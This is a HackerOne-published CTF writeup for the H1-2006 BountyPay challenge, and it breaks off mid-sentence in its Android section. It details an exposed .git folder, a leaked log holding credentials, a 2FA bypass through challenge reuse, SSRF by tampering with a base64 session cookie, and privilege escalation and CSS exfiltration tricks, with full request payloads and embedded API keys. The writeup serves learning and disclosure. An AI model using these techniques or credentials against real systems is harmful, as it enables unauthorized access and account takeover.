{"id":895778,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTU3Nzg=","url":"https://hackerone.com/reports/895778","title":"[H1-2006] CTF Writeup","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-11T03:30:20.287Z","submitted_at":"2020-06-11T03:30:20.287Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nirvana_msu","url":"/nirvana_msu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/451/521/1d0f6443db7f9182f369d52763f1e423273fd58c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-19T18:07:46.713Z","bug_reporter_agreed_on_going_public_at":"2020-06-19T18:01:39.058Z","team_member_agreed_on_going_public_at":"2020-06-19T18:07:46.629Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# H1-2006 CTF Writeup\n\nI am fairly new to CTFs - this is just my second CTF after [H1-415 CTF](https://twitter.com/Hacker0x01/status/1217561343986782209), at which I didn't get far at all. I think the most valuable thing I can do for anyone who comes across this writeup, is to describe exactly what I was thinking at each step along the way, including all my failures and dead ends. I personally always find those parts the most valuable in any bug report or writeup that I read.\n\n---------------------------------------\n\n# TL;DR\n**For those impatient, here is a condensed walk-through of the CTF. If you're here after the long writeup, you can safely skip this part.**.\n\n1. Subdomain enumeration yields several subdomains: `app.bountypay.h1ctf.com` (customer portal with username/password login), `staff.bountypay.h1ctf.com` (staff portal with username/password login), `api.bountypay.h1ctf.com`, `software.bountypay.h1ctf.com`(denies access from public IPs).\n2. Content discovery on `app.bountypay.h1ctf.com` reveals `/.git/config` which references GitHub repo at [https://github.com/bounty-pay-code/request-logger.git](https://github.com/bounty-pay-code/request-logger.git)\n3. Source code in the repo exposes the presence of [`/bp_web_trace.log`](http://app.bountypay.h1ctf.com/bp_web_trace.log) file, which gives us three things:\n    *  Log file gives us `username` and `password` for authentication on the customer portal, `app.bountypay.h1ctf.com`. Using these credentials we're presented with 2FA challenge. On every access It gives us a random `challenge` (md5 hash) that we need to guess a valid `challenge_answer` for.\n    * Log file also gives us a `challenge_answer` (for the past login attempt), but no `challenge` itself. The solution is that `challenge` is simply an md5 hash of the `challenge_answer`, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that `challenge_answer` and use this pair to login.\n    * Last thing the log file gives us is the following endpoint: `GET /statements?month=04\u0026year=2020`\n4. Authentication cookie is base64-encoded JSON such as `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.\n5. The `/statements` endpoint above reveals that it makes a server-side request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04\u0026year=2020`.  When accessed directly, the API endpoint responds with 401 `[\"Missing or invalid Token\"]`. Observe the same account id value, `F8gHiqSdpK`, within the request path- which is in fact taken from `account_id` of the session cookie and interpolated into request path without any sanitization. By changing `account_id` within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.\n6. Front page on `api.bountypay.h1ctf.com` reveals an endpoint that allows a redirect: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including `software.bountypay.h1ctf.com`.\n7.  Content discovery on `software.bountypay.h1ctf.com` via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals `/uploads` folder with Directory Listing enabled. The only file within it, [`BountyPay.apk`](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), can be downloaded directly from a public IP.\n8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`8e9998ee3137ca9ade8f372739f062c1`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.\n9. `X-Token: 8e9998ee3137ca9ade8f372739f062c1` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.\n    * `GET` request returns some JSON data for a couple of staff members, which includes `staff_id`field with values like `STF:KE624RQ2T9`.\n    * `POST` request returns `[\"Missing Parameter\"]` message. The parameter it wants is `staff_id`, and for the valid staff ids it gives `HTTP/1.1 409 Conflict` with message ` [\"Staff Member already has an account\"]`. Response code hints at the fact that it could provision the new account if we give it a valid  staff id who's account has not yet been set up - e.g. a new joiner.\n10. [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account has a tweet `Today we welcome Sandra to the team!!!`, which is the new joiner we're looking for. We can find [Sandra's](https://twitter.com/SandraA76708114) twitter account among either [following](https://twitter.com/BountypayHQ/following) or [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline we see [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`.\n11. Using this `staff_id` in a `POST` request to `/api/staff` provisions a new account, giving us `username` and `password` to access Staff portal at `staff.bountypay.h1ctf.com`.\n12.  After logging in with Sandra's credentials and inspecting available endpoints and JS source code, it becomes apparent that the goal of the next challenge is to upgrade her account to Admin. We can see the endpoint for this in JS code, `/admin/upgrade?username=`, but it can only be done by an admin user. We can \"report\" any page, which makes admin user visit it, but there is an exception that pages under `/admin` would not be visited. There are two separate vulnerabilities that need to be chained to achieve the desired result.\n    * Firstly, the trick is to notice that JS code uses very loose selectors (that are based on class only) to perform several actions: `$(\".upgradeToAdmin\").click` would issue the request to upgrade the account, and `\"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\")` allows us to force Admin to do the click on an element with `.tab4` class. Coincidentally, there is a feature to change avatar - which is a string used as a class name. Setting it to `upgradeToAdmin tab4` and reporting that page (`/?template=ticket\u0026ticket_id=3582#tab4`) allows us to force Admin to make the API call.\n    * What remains is to make sure the above call is made with the correct username, which is taken from an input with name `username`: `let t = $('input[name=\"username\"]').val();`. There is no such input on the page we're reporting (where we can control the class via avatar), `/?template=ticket\u0026ticket_id=3582#tab4`, but there is one in the login page, `/?template=login?username=sandra.allison`. Since backend is PHP we can force `template` parameter to be an array with both `ticket` and `login` values - and luckily for us, a rather weird backend implementation renders both templates and appends them one after another in the response. We can thus piece it all together in a request such as `/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4` that we \"report\" to Admin and this concludes the Privilege Escalation step. In response we're given a new session cookie - when logged in with that cookie we can see a new tab with customer account usernames and clear-text passwords, including Mårten's credentials.\n13. Back to Customer portal, `app.bountypay.h1ctf.com`, we login with new credentials and use same `challenge`/`challenge_answer`pair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that's under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a `\u003clink rel=\"stylesheet\"\u003e` tag with e.g. Burp Collaborator. Under this setup it's not actually possible to exfiltrate data using [recursive techniques](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) such as asynchronous `@import` loading - because imports within `\u003clink\u003e` (unlike `\u003cstyle\u003e`) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.\n\n---------------------------------------\n\n# Long Writeup\n\nFor those more patient, as promised in the beginning, here is a long writeup where I attempt to describe my process of thinking, including all failed attempts and dead ends.\n\nAs usual, the challenge starts with a [tweet](https://twitter.com/Hacker0x01/status/1266454022124376064):\n{F861473}\n\n## Reconnaissance\n\nLooking at the `Scope` section of the CTF [Policy] (https://hackerone.com/h1-ctf?view_policy=true) page, we notice that the domain scope is a wildcard `*.bountypay.h1ctf.com`. An obvious first thing to do is thus to kick off a subdomain enumeration (and frankly one should do this anyway).\n\nMy go-to tool for subdomain enumeration from passive data sources is [Amass](https://github.com/OWASP/Amass). Although you should ideally set it up with all API keys to various data sources, a simple passive enumeration can be done with just:\n```bash\n$ amass enum --passive -d bountypay.h1ctf.com\n```\n\n\u003e I recommend Amass only for passive enumeration. For bruteforcing you'd be better off using [Massdns](https://github.com/blechschmidt/massdns) with a carefully curated list of resolvers. For the reasons why, I highly recommend the excellent post [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) - in fact his entire blog is worth a careful read. \n\nThis enumeration yielded several subdomains:\n\n```plain\napp.bountypay.h1ctf.com\nstaff.bountypay.h1ctf.com\napi.bountypay.h1ctf.com\nwww.bountypay.h1ctf.com\nsoftware.bountypay.h1ctf.com\n```\nFollowing my normal bug hunting routine I then tried to brute-force for more subdomains using [Massdns](https://github.com/blechschmidt/massdns)  with [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt) wordlist, as well as using alterations on existing names with [dnsgen](https://github.com/ProjectAnte/dnsgen), but this did not yield any new results.\n\nNext, I kicked off content discovery on each subdomain. In this instance I've simply used Burp (`Engagement tools`-\u003e`Discover content`), though I can also highly recommend using [ffuf](https://github.com/ffuf/ffuf) for this with a good wordlist.\n\nWhile this was running, I manually reviewed each subdomain - HTML and JS code. First observations:\n * `app` and `staff` subdomains require username/password authentication. I've tried a few naive things (like empty password, admin:admin etc) but nothing worked.\n * `software` subdomain appears to restrict access from public IPs: `You do not have permission to access this server from your IP Address`. Simple things like adding `X-Forwarded-For` or `X-Client-IP`pointing to localhost or other private addresses did not change anything. It is likely that we're going to need to find SSRF to interact with it.\n * `api` subdomain has an interesting redirect in its home page: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. Changing target host to something else, like `example.com`, returns `URL NOT FOUND IN WHITELIST`. My first thought was that the whitelist check could be flawed and it could be vulnerable to an Open Redirect (which might prove useful later, such as e.g. for SSRF) but no trick I could think of worked and it seemed pretty secure (I even tried CRLF injection, also no luck). So if it's a whitelist - then what else could be whitelisted? The obvious thing to try were the other subdomains - and it turns out `software` and `staff` are indeed whitelisted. For now let's just take a note of it, as it might be useful for SSRF - especially to access `software` subdomain which is otherwise restricted by IP.\n\nChecking the content discovery results, I've found the first lead - exposed `/.git/` folder on the `app` subdomain, referencing a GitHub repository:\n\n\u003e Note: In all HTTP requests/responses within this writeup, only the most relevant headers are shown for brevity.\n\n```http\nGET /.git/config HTTP/1.1\nHost: app.bountypay.h1ctf.com\n```\n\n```http\nHTTP/1.1 200 OK\n\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\n\nIt was slightly weird that nearly all other files that are normally present were not there. but that's just part of the CTF. Nevertheless I did try to exfiltrate the content of the repo with [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh):\n```bash\n$ ./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ./output/\n```\nbut that didn't yield anything new.\n\nOk, so all we need from this is the GitHub repo itself.  I've checked this repo (including commit history) and the parent organization, but the only valuable piece of information was [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) file:\n```php\n\u003c?php\n\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\n\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n\nMy first thought was the access `/logger.php` endpoint, but that didn't exist. I then tried accessing `/bp_web_trace.log` and that worked!\n\n```http\nGET /bp_web_trace.log HTTP/1.1\nHost: app.bountypay.h1ctf.com\n```\n\n```http\nHTTP/1.1 200 OK\n\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\n\nI also tried checking both `/logger.php` and `/bp_web_trace.log`on the other subdomains, just in case similar code was deployed there as well, but that didn't work.\n\nDecoding the base64-encoded log entries gives us:\n\n```json\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\n\nOk, so we have a username and password (and also something called `challenge_answer`).\n\n## Login 2FA Bypass\n\nWhen we try to login using these credentials, we're presented with a 2FA challenge:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\n\nusername=brian.oliver\u0026password=V7h0inzX\n```\n\n```html\n\u003cform method=\"post\" action=\"/\"\u003e\n\t\u003cinput type=\"hidden\" name=\"username\" value=\"brian.oliver\"\u003e\n\t\u003cinput type=\"hidden\" name=\"password\" value=\"V7h0inzX\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge\" value=\"8de5d288e39ef1beaa3833100a14aa47\"\u003e\n\t\u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n\t\t\u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n\t\t\u003cdiv class=\"panel-body\"\u003e\n\t\t\t\u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eFor Security we've sent a 10 character password to your mobile phone, please enter it below\u003c/label\u003e\u003c/div\u003e\n\t\t\t\u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword contains characters between A-Z , a-z and 0-9\u003c/label\u003e\u003c/div\u003e\n\t\t\t\u003cdiv\u003e\u003cinput name=\"challenge_answer\" class=\"form-control\"\u003e\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\u003c/div\u003e\n\t\u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n\u003c/form\u003e\n```\n\nSo we have a `challenge` parameter that looks like an MD5 hash (unique for every new request) that we need to find the valid `challenge_answer` for. Recall that we saw `challenge_answer` from Brian's authentication already in the log. Odd part there was that the log contained `challenge_answer` and not `challenge` - but that must have been done on purpose. It most likely means that the `challenge` and `challenge_answer` could be re-used, so `challenge` was removed it would otherwise be too easy. So maybe instead of trying to find `challenge_answer` for the new `challenge` hash that we're given, we should find `challenge` for that `challenge_answer` submitted by Brian?\n\nSo it's clearly an MD5 hash of something. It is also unique on each page reload, so there must be something unique about the string being hashed. That rules out the most obvious things like `username` etc. If it was really sufficiently random then we could never break it, so let's stay positive and assume that it's a unique thing - but something that we actually know. The only such thing that we have is actually the `challenge_answer` itself! I can't say this part of the CTF was \"obvious\" (and it did take me half an hour or so), but it was still a very logical conclusion if you carefully think it through.\n\nAnd indeed, taking MD5 hash of `bD83Jk27dQ` and submitting that as the `challenge`bypasses the 2FA:\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000\nLocation: /\n```\n\n## SSRF\n\nFirst thing we notice is that the session cookie is base64-encoded JSON. When decoded, it is:\n```\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nIt's very interesting and unusual to see a parameter like `account_id` here, so let's take note of that.\n\nAnother piece of information we have now is the javascript file [app.js](https://app.bountypay.h1ctf.com/js/app.js). It references the following endpoint: `\u003ca href=\"/pay/' + s.id + \"/\" + s.hash`, but upon trying to access something like `/pay/1/1` we get `page not found!` response. It clearly needs some valid `id` and `hash` values that we do not have at this stage. Judging from the code, it looks like that endpoint could be used to make the payment to hackers, which is the storyline of this CTF, so it'll likely be needed towards the end of the CTF. \n\nThe only other endpoint we can access, is the one that fetches statements:\n```http\nGET /statements?month=04\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=04\u0026year=2020\",\"data\":\"{\\\"description\\\":\\\"Transactions for 2020-04\\\",\\\"transactions\\\":[]}\"}\n```\n\nJust in case, I've tried to check a range of other year/month combinations (using `Cluster bomb`Attack type within Burp's Intruder) but none returned any valid transactions.\n\nLooking at the response, it is clear the endpoint performs a server-side request to retrieve the data (and it also must have a valid token to authenticate with `api` subdomain). Somewhat unusually, it even shows us the full URL! This smells a lot like SSRF. First thing I've tried was fiddling with `month` and `year` parameters but it didn't yield anything interesting (and even if it did, it wouldn't be of much value as they are in query string, so we couldn't even do path traversal with that). What else can we control within this API request? It must be the account id that we saw in our session cookie before.. there's simply nothing else.\n\nAnd indeed  that worked. Let's try e.g. adding a `#` after the value: `{\"account_id\":\"F8gHiqSdpK#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}` (base64-encode it and use it as the cookie):\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"url\":\"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK#\\/statements?month=05\u0026year=2020\",\"data\":\"{\\\"account_id\\\":\\\"F8gHiqSdpK\\\",\\\"owner\\\":\\\"Mr Brian Oliver\\\",\\\"company\\\":\\\"BountyPay Demo \\\"}\"}\n```\n\nWe even found another endpoint and got some data back for Brian, but it doesn't seem to be particularly useful. Recall now that we have a `software` subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access `software` subdomain. Our payload (decoded session cookie) thus becomes: `{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\n```\n\nThis presents us with a login panel. Extracting HTML from JSON response and prettifying it gives us:\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eSoftware Storage\u003c/title\u003e\n    \u003clink href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cdiv class=\"container\"\u003e\n    \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-sm-6 col-sm-offset-3\"\u003e\n            \u003ch1 style=\"text-align: center\"\u003eSoftware Storage\u003c/h1\u003e\n            \u003cform method=\"post\" action=\"/\"\u003e\n                \u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n                    \u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n                    \u003cdiv class=\"panel-body\"\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eUsername:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"username\" class=\"form-control\"\u003e\u003c/div\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"password\" type=\"password\" class=\"form-control\"\u003e\u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n                \u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n            \u003c/form\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThere isn't much we can do with it since SSRF only allows us to do `GET` requests and not `POST`. What else? As usual, content discovery.  This one is a little bit more tricky to setup since the payload is base64-encoded, but it can still be easily done in Burp. We need to set the whole session cookie value as the target,  and add 3 `Payload Processing` rules:\n1. \"Add prefix\" with value `{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/`\n2. \"Add suffix\" with value `#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`      (the part between them will be our actual payload for content discovery)\n3.  \"Encode\" -\u003e \"Base64-encode\"\n{F861592}\n\nI've used a fairly simple wordlist and got a hit pretty quickly - there is an `/uploads` endpoint with Directory Listing enabled. In hindsight, that could have been guessed pretty easily even without bruteforcing.\n\n```http\nGET /statements?month=05\u0026year=2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nCookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\n```\nHTML code extracted from JSON response is:\n```html\n\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\n\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:26              4043701\n\u003c/pre\u003e\u003chr\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\n\nNot sure why, but I then tried to access APK via SSRF. It didn't work - which is consistent with the behaviour I observed for this SSRF where responses with certain content-types  were not forwarded back to us. I then tried to access the APK [directly](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), and sure enough it worked.\n\n## Android\n\nWhile one could start by grepping strings from an APK, I usually go straight to decompiling the Java code. For this I use [dex2jar](https://github.com/pxb1988/dex2jar)  with a command like:\n```bash\n$ ./d2j-dex2jar.sh -f -o ./../h1-ctf/jar/BountyPay.jar ./../h1-ctf/BountyPay.apk\n```\nIt produces a JAR file which you can then open in [JD-GUI](http://java-decompiler.github.io/). While you can browse the source code directly in JD-GUI, I much prefer JetBrains IDEs. You can export all decompiled code via \"Save all sources\" menu option, unzip the archive and use in in e.g. [IntelliJ IDEA](https://www.jetbrains.com/idea/).\n\nI then read all relevant parts of the source code (there isn't much, if you ignore all the standard android stuff) and it was fairly clear that the app interacts with a Firebase database and attempts to get your through 3 stages, at the end of which you should have some values for Header, Token and Host from that database.\n\nCredentials to access Firebase could be found in `res/values/strings.xml`:\n```xml\n\u003cstring name=\"firebase_database_url\"\u003ehttps://bountypay-90f64.firebaseio.com\u003c/string\u003e\n\u003cstring name=\"gcm_defaultSenderId\"\u003e467982724703\u003c/string\u003e\n\u003cstring name=\"google_api_key\"\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003c/string\u003e\n\u003cstring name=\"google_app_id\"\u003e1:467982724703:android:4428e053082d32ce84b5ea\u003c/string\u003e\n\u003cstring name=\"google_crash_reporting_api_key\"\u003eAIzaSyAyr601_-ElsasDnhGORBykg0ZTDaOxFeo\u003c/string\u003e\n\u003cstring name=\"google_storage_bucket\"\u003ebountypay-90f64.appspot.com\u003c/string\u003e\n```\nI quickly checked for some common misconfigurations, such as whether Firebase was publicly readable by accessing https://bountypay-90f64.firebaseio.com/.json, but it seemed that access controls were properly configured.\n\nI knew I then had two routes - either to understand the code well enough to talk to a database directly and extract the needed data (and maybe write a small script for it) or to try and follow through the app exactly as it was designed. Former would have probably been quicker, but the latter seemed more interesting - so I went ahead and installed APK on an emulator.\n\nThere are different technologies you could use here. I'm not an expert in Android, but given how generally awesome IntelliJ platform is, the obvious choice for me was to use [Android Studio](https://developer.android.com/studio/).\n\nRunning emulator is fairly straight-forward, and is described in these guides:\n * https://developer.android.com/studio/run/emulator\n * https://developer.android.com/studio/run/managing-avds\n\nThe steps I've taken to set up my environment were as follows:\n\n1. Open Android Studio, select \"debug APK\" and point to APK file.\n2. Install Android SDK, if not already\n3. Create new device within AVD and start it\n\nI've also set up traffic proxying through Burp:\n1. Configure proxy in the Emulator's settings as described [here](https://developer.android.com/studio/run/emulator-networking).\n2. Install Burp's CA certificate on the device. You can follow Burp guide [here](https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-android-device) but I find it easier to push the certificate to device's SD card using `adb` (as opposed to sending it via email):\n\n```bash\n$ adb push cacert.cer /mnt/sdcard\n```\n\n### Android | PartOneActivity\n\nNow that everything is set up we can launch the app. First it just asks us for our username and (optional) twitter handle. On the next screen, nothing seems to happen, and the clues at the bottom say \"deep links\" and \"params\":\n{F862914}\n\nGoing back to our Java source code, within `PartOneActivity.java`, we see:\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  String str = 